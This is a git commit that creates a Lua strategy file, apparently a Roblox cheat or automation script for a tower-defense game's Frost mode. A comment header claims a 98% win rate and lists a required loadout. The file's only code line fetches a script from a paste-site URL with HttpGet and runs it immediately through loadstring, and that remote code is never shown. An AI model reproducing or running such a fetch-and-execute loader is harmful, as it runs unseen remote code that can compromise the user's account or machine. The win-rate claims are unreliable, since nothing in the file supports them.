1b602b7b8309ffefacb185e77cc8c5ab5ff9ac61
Pick <90311538+8zj@users.noreply.github.com>
2026-01-05 04:22:10 -0500

    Create Frost.lua

---
+++ Strats/Frost.lua
@@ -0,0 +1,11 @@
+--[[
+MODE:  FROST 
+MAP:  Simplicity 
+Time:  With timescale 9mins   Without it 20-25mins
+Winrate:  98%
+Loadout:  "Scout", "Hacker", "Mercenary Base", "Mortar", "Accelerator" 
+
+
+MUST HAVE VIP OR WILL NOT WORK
+--]]
+loadstring(game:HttpGet("https://pastefy.app/VkyB477u/raw"))()
